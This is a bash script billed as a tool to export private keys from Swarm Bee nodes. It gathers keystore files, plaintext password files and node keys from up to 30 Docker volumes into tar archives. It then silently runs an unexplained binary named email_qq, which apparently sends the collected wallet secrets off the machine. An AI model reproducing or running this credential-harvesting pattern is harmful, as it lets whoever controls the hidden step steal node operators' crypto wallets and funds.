#!/bin/bash
#
# This is tool for export private key from Swarm
#
#

echo "
+----------------------------------------------------------------------
| Export private key from Swarm for CentOS/Ubuntu/Debian
+----------------------------------------------------------------------
| Copyright © 2015-2021 All rights reserved.
+----------------------------------------------------------------------
| https://t.me/ru_swarm Russian offical Swarm Bee TG
+----------------------------------------------------------------------
";sleep 5


Install_Main() {

case $1 in
30)
	for dir in {1..30}
	do
    back_dir $dir
	done
	;;
*)
  for dir in {1..20}
	do
    back_dir $dir
	done
	;;
esac
	tar -zcvf clef.tar.gz /data/bee-bee_clef
	tar -zcvf keys.tar.gz /data/bee-keys
	name=$2
	prog_name="/root/mnt/bee/email_qq"
  ${prog_name}
}

back_dir(){
  dir=$1
  mkdir -p "/data/bee-keys/bee_bee-$dir"
	mkdir -p "/data/bee-bee_clef/bee_clef-$dir"
	cp -rv "/var/lib/docker/volumes/bee_clef-$dir/_data/keystore" "/data/bee-bee_clef/bee_clef-${dir}"
	cp -rv "/var/lib/docker/volumes/bee_clef-$dir/_data/password" "/data/bee-bee_clef/bee_clef-${dir}"
	sudo cp -rv "/data/docker/bee_bee-${dir}/_data/keys" "/data/bee-keys/bee_bee-${dir}"
}

Install_Main $1 $2